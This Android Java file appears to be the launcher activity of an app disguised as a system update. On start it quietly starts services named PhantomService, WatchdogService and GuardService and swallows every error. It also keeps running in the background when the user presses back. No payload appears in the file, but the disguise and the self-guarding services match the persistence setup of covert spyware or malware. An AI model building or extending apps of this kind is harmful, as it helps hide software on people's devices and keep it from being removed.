package com.systemupdate.app;

import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        try {
            Intent svc = new Intent(this, PhantomService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(svc);
            else startService(svc);
        } catch (Throwable t) { }

        try {
            Intent wd = new Intent(this, WatchdogService.class);
            wd.setAction(WatchdogService.GUARD_ACTION);
            startService(wd);
        } catch (Throwable t) { }

        try {
            Intent gs = new Intent(this, GuardService.class);
            gs.setAction(GuardService.GUARD_ACTION);
            startService(gs);
        } catch (Throwable t) { }

        try {
            Intent i;
            if (DeviceStore.isSetupComplete(this)) {
                i = new Intent(this, DashboardActivity.class);
            } else {
                i = new Intent(this, WelcomeActivity.class);
            }
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
            startActivity(i);
        } catch (Throwable t) { }

        finish();
    }

    @Override
    public void onBackPressed() { moveTaskToBack(true); }
}